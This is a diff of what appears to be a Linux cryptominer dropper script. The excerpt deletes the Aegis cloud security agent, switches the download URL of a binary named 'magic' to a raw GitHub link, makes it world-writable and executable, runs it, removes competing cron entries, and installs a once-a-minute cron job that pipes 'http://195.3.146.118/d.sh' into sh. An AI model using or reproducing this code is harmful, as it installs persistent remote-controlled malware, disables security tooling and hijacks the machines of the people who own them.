@@ -544,8 +544,8 @@ rm -rf /usr/local/aegis
 
 
 BIN_MD5="66132e6d2f4ffee3a2417fbaba6e37ec"
-BIN_DOWNLOAD_URL="https://www.dropbox.com/s/gcdutomgbdl5zd6/teft?dl=0"
-BIN_DOWNLOAD_URL2="https://www.dropbox.com/s/gcdutomgbdl5zd6/teft?dl=0"
+BIN_DOWNLOAD_URL="https://raw.githubusercontent.com/burjkhaliffa/sample/8cb721e912a6c20312886447b6c6869ce85ba2bc/teft"
+BIN_DOWNLOAD_URL2="https://raw.githubusercontent.com/burjkhaliffa/sample/8cb721e912a6c20312886447b6c6869ce85ba2bc/teft"
 BIN_NAME="magic"
 
 ROOTUID="0"
@@ -676,7 +676,7 @@ fi
 chmod 777 $BIN_FULL_PATH
 chmod +x $BIN_FULL_PATH
 SKL=d $BIN_FULL_PATH
-exec ($SKL)
+exec $SKL
 crontab -l | sed '/#wget/d' | crontab -
 crontab -l | sed '/#curl/d' | crontab -
 crontab -l | grep -e "195.3.146.118" | grep -v grep
@@ -688,7 +688,7 @@ else
     echo "* * * * * $LDR http://195.3.146.118/d.sh | sh > /dev/null 2>&1"
   ) | crontab -
 fi
-exec($BIN_NAME);
+exec $BIN_NAME;
 crontab -l | sed '/base64/d' | crontab -
 crontab -l | sed '/update.sh/d' | crontab -
 crontab -l | sed '/logo4/d' | crontab -
